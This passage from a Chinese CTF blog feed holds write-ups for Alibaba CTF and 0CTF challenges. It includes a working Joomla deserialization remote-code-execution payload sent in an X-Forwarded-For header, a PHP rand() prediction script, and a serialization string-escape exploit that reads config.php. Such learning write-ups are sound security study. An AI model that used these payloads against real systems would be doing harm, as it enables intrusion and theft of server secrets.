class="number">0xF</span></span><br><span class="line">	<span class="literal">result</span> += chr(tmp)</span><br><span class="line"></span><br><span class="line"><span class="literal">result</span> += <span class="string">"a"</span></span><br><span class="line">print <span class="literal">result</span></span><br><span class="line"><span class="comment"># $ python crack.py | ./crackme</span></span><br><span class="line"><span class="comment"># I want ur password:Yes!</span></span><br><span class="line"><span class="comment"># $ python crack.py</span></span><br><span class="line"><span class="comment"># t.cn/RGRtojGa</span></span><br></pre></td></tr></table></figure></p>
<p>去掉最后的a，就是下一题的入口了</p>
<h1 id="Step_3">Step 3</h1><p><a href="http://112.124.106.246/7fbde8d70c816033/index.php" target="_blank" rel="external">http://112.124.106.246/7fbde8d70c816033/index.php</a><br>打开来一看是…..Joomla。。。。。。。。。。<br>0CTF的piapiapia那题搜关于php序列化的漏洞搜出来的全是这个博客的反序列化截断漏洞。。。。<br>然后发现这漏洞阿里云还写了分析报告，好了。。。估计就是这洞了。。。<br>payload:<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="variable">url =</span> <span class="string">"http://112.124.106.246/7fbde8d70c816033/index.php"</span></span><br><span class="line"><span class="variable">header =</span> &#123;</span><br><span class="line">	<span class="string">"X-Forwarded-For"</span>: '&#125;__test|O:<span class="number">21</span>:<span class="string">"JDatabaseDriverMysqli"</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">"fc"</span>;O:<span class="number">17</span>:<span class="string">"JSimplepieFactory"</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">21</span>:<span class="string">"\\0\\0\\0disconnectHandlers"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">9</span>:<span class="string">"SimplePie"</span>:<span class="number">5</span>:&#123;s:<span class="number">8</span>:<span class="string">"sanitize"</span>;O:<span class="number">20</span>:<span class="string">"JDatabaseDriverMysql"</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">8</span>:<span class="string">"feed_url"</span>;s:<span class="number">37</span>:<span class="string">"phpinfo();JFactory::getConfig();exit;"</span>;s:<span class="number">19</span>:<span class="string">"cache_name_function"</span>;s:<span class="number">6</span>:<span class="string">"assert"</span>;s:<span class="number">5</span>:<span class="string">"cache"</span>;b:<span class="number">1</span>;s:<span class="number">11</span>:<span class="string">"cache_class"</span>;O:<span class="number">20</span>:<span class="string">"JDatabaseDriverMysql"</span>:<span class="number">0</span>:&#123;&#125;&#125;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">"init"</span>;&#125;&#125;s:<span class="number">13</span>:<span class="string">"\\0\\0\\0connection"</span>;b:<span class="number">1</span>;&#125;\xf0',</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">req =</span> requests.get(url, <span class="variable">headers=</span>header)</span><br><span class="line">print req.content</span><br><span class="line"><span class="comment"># $ python payload.py</span></span><br><span class="line"><span class="comment"># Success! key:xxxxxxxxxxxxxxxxxxxxx 发简历时附加此key有加分</span></span><br></pre></td></tr></table></figure></p>
<p>撸了两节课撸完了。。。还是继续研究0CTF去了。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf0.png" alt="alictf0"></p>
<blockquote>
<p>这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。<br>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[0CTF总结]]></title>
    <link href="http://0x48.pw/2016/03/14/0x12/"/>
    <id>http://0x48.pw/2016/03/14/0x12/</id>
    <published>2016-03-14T02:25:27.000Z</published>
    <updated>2016-03-28T10:19:17.966Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>这次的0CTF我们投机取巧派被学院派教做人。。然后发现自己，不会js，不会php。不会python。web题看了两题，都差一点出来。。</p>
</blockquote>
<a id="more"></a>
<h1 id="rand_2">rand_2</h1><p>题目源码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'time'</span>] &amp;&amp; time() - <span class="variable">$_SESSION</span>[<span class="string">'time'</span>] &gt; <span class="number">60</span>) &#123;</span><br><span class="line">	session_destroy();</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'timeout'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">'time'</span>] = time();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> rand();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'go'</span>])) &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">'rand'</span>] = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$i</span> = <span class="number">5</span>;</span><br><span class="line">	<span class="variable">$d</span> = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$i</span>--)&#123;</span><br><span class="line">		<span class="variable">$r</span> = (string)rand();</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">'rand'</span>][] = <span class="variable">$r</span>;</span><br><span class="line">                <span class="variable">$d</span> .= <span class="variable">$r</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> md5(<span class="variable">$d</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'check'</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">'check'</span>] === <span class="variable">$_SESSION</span>[<span class="string">'rand'</span>]) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'die'</span>;</span><br><span class="line">		session_destroy();</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这题看了国外的论文后知道了通过rand()随机出来的伪随机数有一个规律：<code>r[i] = r[i-3] + r[i-31]</code></p>
<p>这里有一个需要注意的地方，题目服务器是ubuntu<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php&gt; echo <span class="function"><span class="title">getrandmax</span><span class="params">()</span></span> </span><br><span class="line"><span class="number">2147483647</span></span><br></pre></td></tr></table></figure></p>
<p>linux服务器随机数的范围是0-2147483647, 所以 <code>r[i] = (r[i-3] + r[i-31]) % 2147483648</code><br>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">POC</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.url = <span class="string">"http://202.120.7.202:8888"</span></span><br><span class="line">		self.url2 = <span class="string">"http://202.120.7.202:8888/?go="</span></span><br><span class="line">		self.url3 = <span class="string">"http://202.120.7.202:8888/?"</span></span><br><span class="line">		self.s = requests.session()</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">		ran_num = []</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">49</span>):</span><br><span class="line">			req = self.s.get(self.url)</span><br><span class="line">			cont = req.content</span><br><span class="line">			<span class="keyword">try</span>:</span><br><span class="line">				num = re.findall(<span class="string">r'(.+)&lt;code&gt;'</span>,cont)[<span class="number">0</span>]</span><br><span class="line">			<span class="keyword">except</span>:</span><br><span class="line">				<span class="keyword">print</span> i</span><br><span class="line">				exit(-<span class="number">1</span>)</span><br><span class="line">			ran_num(int(num))</span><br><span class="line"></span><br><span class="line">		req = self.s.get(self.url2)</span><br><span class="line">		cont = req.content</span><br><span class="line">		ran_num.append(int(cont[<span class="number">1</span>:-<span class="number">32</span>]))</span><br><span class="line">		md5_num = cont[-<span class="number">32</span>:]</span><br><span class="line">		</span><br><span class="line">		go_num = []</span><br><span class="line">		<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">			y = <span class="number">50</span> + x</span><br><span class="line">			tem_num1 = (ran_num[y-<span class="number">3</span>] + ran_num[y-<span class="number">31</span>]) % <span class="number">2147483648</span></span><br><span class="line">			ran_num.append(tem_num1)</span><br><span class="line">			go_num.append(str(tem_num1))</span><br><span class="line"></span><br><span class="line">		now_num = <span class="string">""</span>.join(go_num)</span><br><span class="line">		now_md5 = hashlib.md5(now_num).hexdigest()</span><br><span class="line">		<span class="keyword">if</span> md5_num == now_md5:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"yes"</span></span><br><span class="line">			self.num5 = self.go_num</span><br><span class="line">			self.suc()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">suc</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">for</span> x <span class="keyword">in</span> self.num5:</span><br><span class="line">			self.url3 += <span class="string">"check[]="</span>+str(x) + <span class="string">"&amp;"</span></span><br><span class="line">		req = self.s.get(self.url3)</span><br><span class="line">		<span class="keyword">print</span> req.content</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	t = POC()</span><br><span class="line">	t.test()</span><br></pre></td></tr></table></figure></p>
<p>然后我没做出来的问题在于。。。。我不会python..<br>error code:<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="atom">ran_num</span>.<span class="atom">append</span>(<span class="atom">int</span>(<span class="atom">cont</span>[<span class="number">1</span>:-<span class="number">33</span>]))</span><br><span class="line"><span class="atom">md5_num</span> = <span class="atom">cont</span>[-<span class="number">33</span>:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure></p>
<p>然后这题发现没法复现，本地或是自己的服务器中，每次访问rand的seed都会变，就算keep-alive也是。。不知道题目服务器做了啥设置。。。</p>
<h1 id="piapiapia">piapiapia</h1><p>这题是代码审计，让我知道了原来我不会php<br>大致看了一遍可以看出一处问题：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// update.php</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, <span class="variable">$_POST</span>[<span class="string">'nickname'</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure></p>
<p>如果POST或者GET传参除了字符串还可以传递数组，所以如果nickname为数组的话，则可绕过该判断。update.php中之后是将输入序列化，在profile.php中反序列化。所以猜测是序列化这有洞，可是google搜了一通之后。得到的都是Joomla的反序列化截断漏洞。并没有得到啥有用的信息。。</p>
<p>然后又有一发现<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safe</span> <span class="subst">=</span> <span class="built_in">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line"><span class="variable">$safe</span> <span class="subst">=</span> <span class="string">'/'</span> <span class="built_in">. </span>implode(<span class="string">'|'</span>, <span class="variable">$safe</span>) <span class="built_in">. </span><span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">'hacker'</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure></p>
<p>如果输入中有where则会变成hacker，多了一个字符，反序列化的时候会出错。。当时并没有想出利用方法。。之后看了wp之后才知道。</p>
<p>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">POC</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.data = &#123;<span class="string">"username"</span>: <span class="string">"ddog1"</span>, <span class="string">"password"</span>: <span class="string">"ddog1"</span>&#125;</span><br><span class="line">		self.reg()</span><br><span class="line">		self.login()</span><br><span class="line">		self.fuck()</span><br><span class="line">		self.get_flag()	</span><br><span class="line">			</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx/register.php"</span></span><br><span class="line">		req = requests.post(url, data=self.data)</span><br><span class="line">		<span class="keyword">if</span> req.status_code != <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">			</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx:8085/index.php"</span></span><br><span class="line">		req = requests.post(url, data=self.data)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> re.search(<span class="string">"UPDATE|Profile"</span>,req.content):</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"login fail！"</span></span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">		cookie = req.request.headers[<span class="string">'Cookie'</span>]</span><br><span class="line">		cookie = cookie.split(<span class="string">"="</span>)</span><br><span class="line">		self.cookie = &#123;cookie[<span class="number">0</span>]: cookie[<span class="number">1</span>]&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx:8085/update.php"</span></span><br><span class="line">		payload = <span class="string">'";&#125;s:5:"photo";s:10:"config.php";&#125;;'</span></span><br><span class="line">		payload = <span class="string">"where"</span> * len(payload) + payload</span><br><span class="line">		f = open(<span class="string">'/tmp/a.jpg'</span>,<span class="string">"w"</span>)</span><br><span class="line">		f.write(<span class="string">"fffff"</span>*<span class="number">1024</span>)</span><br><span class="line">		f.close()</span><br><span class="line">		files = &#123;<span class="string">"photo"</span>: (<span class="string">"fff.jpg"</span>, open(<span class="string">"/tmp/a.jpg"</span>,<span class="string">"rb"</span>))&#125;</span><br><span class="line">		data = &#123;<span class="string">"phone"</span>: <span class="string">"1"</span>*<span class="number">11</span>, <span class="string">"email"</span>: <span class="string">"fffff@qq.com"</span>, <span class="string">"nickname[]"</span>: payload&#125;</span><br><span class="line">		req = requests.post(url, data=data, cookies=self.cookie, files=files)</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> re.search(<span class="string">"Success"</span>, req.content):</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">		url = <span class="string">"http://xxx:8085/profile.php"</span></span><br><span class="line">		req = requests.get(url, cookies=self.cookie)</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			base = re.findall(<span class="string">'base64,(.+?)"'</span>,req.content)[<span class="number">0</span>]</span><br><span class="line">		<span class="keyword">except</span>:</span><br><span class="line">			<span class="keyword">print</span> req.content</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"crack fail!"</span></span><br><span class="line">			exit(-<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"crack success!"</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"=========================="</span></span><br><span class="line">		<span class="keyword">print</span> base64.b64decode(base)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"=========================="</span></span><br><span class="line">		</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	POC()</span><br></pre></td></tr></table></figure></p>
<p>这题没做出来就是对序列化的理解不清楚。比如一个序列化字符串<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">a</span>:<span class="value"><span class="number">1</span>:&#123;i:<span class="number">0</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">5</span>:<span class="string">"aaaaa"</span></span></span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>第一点</strong>，反序列化时，当反序列化完一个序列后，就会停止，比如<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">a</span>:<span class="value"><span class="number">1</span>:&#123;i:<span class="number">0</span></span></span>;<span class="rule"><span class="attribute">s</span>:<span class="value"><span class="number">5</span>:<span class="string">"aaaaa"</span></span></span>;&#125;<span class="tag">dfklasfjkal</span></span><br></pre></td></tr></table></figure></p>
<p>上面的字符串进行反序列化和第一个字符串反序列化是一样的。。。</p>
<p><strong>第二点</strong>，序列化字符串里没有转义字符。。所以说有了可以闭合序列化的可能，关键在于长度，序列一共由三部分组成，<code>数据类型:长度:数据</code>，看下面的例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;i:0;s:5:"aa";&#125;";&#125;'</span>));</span><br><span class="line"><span class="comment">// out</span></span><br><span class="line"><span class="comment">// array(1) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(5) "aa\";&#125;"</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br><span class="line">then</span><br><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;i:0;s:2:"aa";&#125;";&#125;'</span>));</span><br><span class="line"><span class="comment">// out</span></span><br><span class="line"><span class="comment">// array(1) &#123;</span></span><br><span class="line"><span class="comment">//  [0]=&gt;</span></span><br><span class="line"><span class="comment">//  string(2) "aa"</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这就是这题的重点了，但是怎么控制长度呢？就是通过 <code>where -&gt; hacker</code>  然后字符串逃逸。<br>所以得出payload:<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = '<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;;'</span></span><br><span class="line">payload = <span class="string">"where"</span> * len(payload) + payload</span><br></pre></td></tr></table></figure></p>
<p>然后是复现这题，在复现的过程中随便学习了下运维。。</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"># 新建组</span><br><span class="line">$ groupadd ctf5</span><br><span class="line"># 新建一个专门用于php-fpm的用户</span><br><span class="line">$ useradd ctf5 -<span class="keyword">M</span> -s /sbin/nologin -<span class="keyword">g</span> ctf5</span><br><span class="line"># 创建pid, sock文件</span><br><span class="line">$ touch /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm-ctf5.pid</span><br><span class="line">$ touch /tmp/php-cgi-ctf5.sock</span><br><span class="line"># sock是被nginx使用所以需要把所属用户和用户组改成和nginx一样</span><br><span class="line">$ chown www:www /tmp/php-cgi-ctf5.sock</span><br><span class="line"># 修改nginx虚拟主机文件</span><br><span class="line">$ vim /usr/<span class="keyword">local</span>/nginx/<span class="keyword">conf</span>/vhost/ctf5.<span class="keyword">conf</span></span><br><span class="line">    fastcgi_pass  unix:/tmp/php-cgi-ctf5.sock;    #修改成这样</span><br><span class="line"># 创建php-fpm配置文件</span><br><span class="line">$ cp /usr/<span class="keyword">local</span>/php/etc/php-fpm.<span class="keyword">conf</span> /usr/<span class="keyword">local</span>/php/etc/php-fpm-ctf5.<span class="keyword">conf</span></span><br><span class="line">$ vim /usr/<span class="keyword">local</span>/php/etc/php-fpm-ctf5.<span class="keyword">conf</span></span><br><span class="line">[<span class="keyword">global</span>]</span><br><span class="line">pid = /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm-ctf5.pid</span><br><span class="line">error_log = /usr/<span class="keyword">local</span>/php/<span class="keyword">var</span>/<span class="keyword">log</span>/php-fpm-ctf5.<span class="literal">log</span></span><br><span class="line">log_level = notice</span><br><span class="line"></span><br><span class="line">[ctf5]</span><br><span class="line">listen = /tmp/php-cgi-ctf5.sock</span><br><span class="line">listen.backlog = -1</span><br><span class="line">listen.allowed_clients = 127.0.0.1</span><br><span class="line">listen.owner = ctf5</span><br><span class="line">listen.group = ctf5</span><br><span class="line">listen.mode = 0666</span><br><span class="line">user = ctf5</span><br><span class="line">group = ctf5</span><br><span class="line">pm = dynamic</span><br><span class="line">pm.max_children = 10</span><br><span class="line">pm.start_servers = 1</span><br><span class="line">pm.min_spare_servers = 1</span><br><span class="line">pm.max_spare_servers = 6</span><br><span class="line">request_terminate_timeout = 100</span><br><span class="line">request_slowlog_timeout = 0</span><br><span class="line">slowlog = <span class="keyword">var</span>/<span class="keyword">log</span>/slow-ctf5.<span class="literal">log</span></span><br><span class="line"></span><br><span class="line"># 修改/etc/init.<span class="keyword">d</span>/php-fpm</span><br><span class="line">vhost=<span class="label">$2</span></span><br><span class="line"><span class="keyword">if</span> [ -<span class="keyword">n</span> <span class="string">"$vhost"</span> ];then</span><br><span class="line">        vhost=-<span class="label">$vhost</span></span><br><span class="line">fi</span><br><span class="line">php_fpm_CONF=<span class="label">$&#123;prefix&#125;</span>/etc/php-fpm<span class="label">$vhost</span>.<span class="keyword">conf</span></span><br><span class="line">php_fpm_PID=<span class="label">$&#123;prefix&#125;</span>/<span class="keyword">var</span>/<span class="keyword">run</span>/php-fpm<span class="label">$vhost</span>.pid</span><br><span class="line"></span><br><span class="line">restart)</span><br><span class="line">                <span class="label">$0</span> stop <span class="label">$2</span></span><br><span class="line">                <span class="label">$0</span> start <span class="label">$2</span></span><br><span class="line"></span><br><span class="line"># 修改文件夹权限</span><br><span class="line">$ chown ctf5:www -R /home/wwwroot/ctf5</span><br><span class="line"># 最后记得重启</span><br><span class="line">$ sudo /etc/init.<span class="keyword">d</span>/nginx restart</span><br><span class="line">$ sudo /etc/init.<span class="keyword">d</span>/php-fpm start 